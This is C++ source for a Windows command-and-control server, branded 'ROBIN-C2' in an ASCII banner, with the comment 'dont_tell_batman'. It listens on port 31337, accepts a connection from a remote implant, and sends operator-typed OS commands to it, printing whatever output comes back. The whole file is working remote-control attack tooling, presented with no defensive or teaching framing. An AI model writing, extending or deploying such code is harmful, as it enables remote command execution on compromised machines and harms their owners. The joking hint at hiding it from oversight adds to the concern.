#include <iostream>
#include <string>
#include <winsock2.h>

//dont_tell_batman

//______ ___________ _____ _   _        _____  _____ 
//| ___ \  _  | ___ \_   _| \ | |      /  __ \/ __  \
//| |_/ / | | | |_/ / | | |  \| |______| /  \/`' / /'
//|    /| | | | ___ \ | | | . ` |______| |      / /  
//| |\ \\ \_/ / |_/ /_| |_| |\  |      | \__/\./ /___
//\_| \_|\___/\____/ \___/\_| \_/       \____/\_____/
                                                   

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(31337);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, 1);

    std::cout << "Waiting for client connection..." << std::endl;

    SOCKET clientSocket = accept(serverSocket, NULL, NULL);

    while (true) {
        std::cout << "Enter OS command to send: ";
        std::string command;
        std::getline(std::cin, command);

        if (command == "exit") {
            break;
        }

        send(clientSocket, command.c_str(), command.size(), 0);

        char buffer[4096];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        std::string commandOutput(buffer, bytesReceived);

        std::cout << "Command Output:" << std::endl;
        std::cout << commandOutput << std::endl;
    }

    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
